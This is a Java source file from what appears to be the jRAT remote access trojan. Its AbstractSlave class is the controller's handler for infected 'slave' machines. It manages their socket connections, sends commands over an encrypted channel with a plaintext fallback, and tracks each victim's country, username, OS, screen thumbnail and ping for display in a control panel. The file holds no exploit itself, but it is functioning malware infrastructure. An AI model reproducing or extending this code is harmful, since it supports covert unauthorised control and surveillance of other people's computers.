package su.jrat.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.security.PublicKey;
import java.util.Random;

import javax.swing.ImageIcon;

import su.jrat.client.exceptions.CloseException;
import su.jrat.client.ip2c.Country;
import su.jrat.client.net.PortListener;
import su.jrat.client.packets.outgoing.AbstractOutgoingPacket;
import su.jrat.client.packets.outgoing.Packet99Encryption;
import su.jrat.client.settings.Settings;
import su.jrat.client.ui.frames.Frame;
import su.jrat.client.ui.panels.PanelMainLog;
import su.jrat.client.utils.FlagUtils;
import su.jrat.client.utils.Utils;
import su.jrat.common.OperatingSystem;
import su.jrat.common.Version;
import su.jrat.common.codec.Hex;
import su.jrat.common.crypto.Crypto;

public abstract class AbstractSlave implements Runnable {

	public static boolean encryption = true;
	
	protected PortListener connection;
	protected Socket socket;

	protected InputStream inputStream;
	protected OutputStream outputStream;
	protected DataOutputStream dos;
	protected DataInputStream dis;
	
	protected String country;
	protected PublicKey rsaKey;
	protected byte[] key;
	protected boolean responded = false;
	protected boolean verified = false;
	protected boolean checked = false;
	protected boolean selected = false;
	protected boolean lock = false;
	protected long pingms = 0;
	protected long sent = 0;
	protected long received = 0;
	protected final long uniqueId = (new Random()).nextLong();
	protected int ping = 0;
	protected String serverid;
	protected String username;
	protected ImageIcon thumbnail;
	protected String version;
	protected String osname;

	private String ip;
	private String host;

	public AbstractSlave(PortListener connection, Socket socket) {
		this.connection = connection;
		this.socket = socket;

		this.ip = socket.getInetAddress().getHostAddress() + " / " + socket.getPort();
		this.host = socket.getInetAddress().getHostName();
	}

	public void initialize() throws Exception {
		this.inputStream = socket.getInputStream();
		this.outputStream = socket.getOutputStream();

		this.dis = new DataInputStream(inputStream);
		this.dos = new DataOutputStream(outputStream);
		
		this.socket.setSoTimeout(connection.getTimeout());
		this.socket.setTrafficClass(24);
		
		if (Settings.getGlobal().getBoolean("geoip")) {
			Country country = FlagUtils.getCountry(this);

			if (country != null) {
				this.country = country.get2cStr();

				if (this.country.equalsIgnoreCase("ZZ")) {
					this.country = "?";
				}
			} else {
				this.country = "?";
			}
		} else {
			this.country = "?";
		}

		PanelMainLog.instance.addEntry("Connect", this, "");
	}

	public AbstractSlave(String ip) {
		this.ip = ip;
	}

	public PortListener getConnection() {
		return connection;
	}

	public Socket getSocket() {
		return socket;
	}

	public String getIP() {
		return ip;
	}
	
	public String getHost() {
		return host;
	}
	
	public String getRawIP() {
		return getIP().split(" / ")[0];
	}

	public String getPort() {
		return getIP().split(" / ")[1];
	}
	
	public void closeSocket(CloseException ex) {
		try {
			socket.close();
			ex.printStackTrace();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public void writeShort(short i) throws Exception {
		dos.writeShort(i);
	}

	public short readShort() throws Exception {
		return dis.readShort();
	}

	public byte readByte() throws Exception {
		return dis.readByte();
	}

	public void writeByte(int b) throws Exception {
		dos.writeByte(b);
	}

	public boolean readBoolean() throws Exception {
		return dis.readBoolean();
	}

	public void writeBoolean(boolean b) throws Exception {
		dos.writeBoolean(b);
	}

	public int readInt() throws Exception {
		return dis.readInt();
	}

	public void writeInt(int i) throws Exception {
		dos.writeInt(i);
	}

	public long readLong() throws Exception {
		return dis.readLong();
	}

	public void writeLong(long l) throws Exception {
		dos.writeLong(l);
	}

	public void writeLine(Object obj) {
		writeLine(obj.toString());
	}

	public void writeLine(String s) {
		try {
			String enc = Crypto.encrypt(s, getKey());

			if (enc.contains("\n")) {
				enc = "-h " + Hex.encode(s);
			} else if (s.startsWith("-c ")) {
				enc = s;
			} else if (!encryption) {
				enc = "-c " + s;
			}

			dos.writeShort(enc.length());
			dos.writeChars(enc);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public String readLine() throws Exception {
		short len = dis.readShort();

		StringBuilder builder = new StringBuilder();
		for (int i = 0; i < len; i++) {
			builder.append(dis.readChar());
		}

		String s = builder.toString();

		if (s.startsWith("-h ")) {
			s = Hex.decode(s.substring(3, s.length()));
		} else if (s.startsWith("-c ")) {
			s = s.substring(3, s.length());
		} else {
			try {
				s = Crypto.decrypt(s, getKey());
			} catch (Exception e) {
				e.printStackTrace();
				s = null;
			}
		}

		return s;
	}
	
	public byte[] getKey() {
		return key;
	}
	

	public void lock() {
		lock = !lock;
	}

	public static final synchronized void toggleEncryption(boolean b) {
		encryption = b;

		for (AbstractSlave slave : Main.connections) {
			slave.addToSendQueue(new Packet99Encryption(b));
		}

	}

	public boolean isLocked() {
		return lock;
	}

	public long getUniqueId() {
		return uniqueId;
	}
	
	public DataInputStream getDataInputStream() {
		return dis;
	}
	
	public DataOutputStream getDataOutputStream() {
		return dos;
	}
	
	public synchronized void addToSendQueue(AbstractOutgoingPacket packet) {
		while (lock) {
			try {
				Thread.sleep(10L);
			} catch (Exception ex) {
				ex.printStackTrace();
			}

		}
		try {
			sendPacket(packet, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public abstract void sendPacket(AbstractOutgoingPacket packet, DataOutputStream dos) throws Exception;

	public abstract void ping() throws Exception;

	public void beginPing() throws Exception {
		pingms = System.currentTimeMillis();
		ping();
	}

	public int getPing() {
		return ping;
	}

	public void setPing(int ping) {
		this.ping = ping;
	}
	
	public void pong() {
		long ping = System.currentTimeMillis() - pingms;
		this.ping = (int) ping;
		
		Frame.mainModel.setValueAt(ping + " ms", Utils.getRow(3, getIP()), 4);		
	}
	
	public abstract String getDisplayName();
	
	public String getUsername() {
		return username;
	}

	public void setUsername(String username) {
		this.username = username;
	}

	public String getServerID() {
		return serverid;
	}

	public void setServerID(String serverid) {
		this.serverid = serverid;
	}

	public boolean isSelected() {
		return selected;
	}

	public void setSelected(boolean selected) {
		this.selected = selected;
	}

	public ImageIcon getThumbnail() {
		return thumbnail;
	}

	public void setThumbnail(ImageIcon thumbnail) {
		this.thumbnail = thumbnail;
	}
	
	public String getCountry() {
		return country.toUpperCase();
	}

	public boolean isVerified() {
		return verified;
	}

	public String getVersion() {
		return version;
	}

	public void setVersion(String version) {
		this.version = version;
	}

	public boolean isUpToDate() {
		return getVersion().equals(Version.getVersion());
	}

	public void setVerified(boolean verified) {
		this.verified = verified;
	}
	
	public ImageIcon getFlag() {
		return FlagUtils.getFlag(country);
	}

	public String getOperatingSystem() {
		return osname;
	}

	public void setOperatingSystem(String osname) {
		this.osname = osname;
	}

	public OperatingSystem getOS() {
		String os = this.getOperatingSystem().toLowerCase();
		return OperatingSystem.getOperatingSystem(os);
	}

}
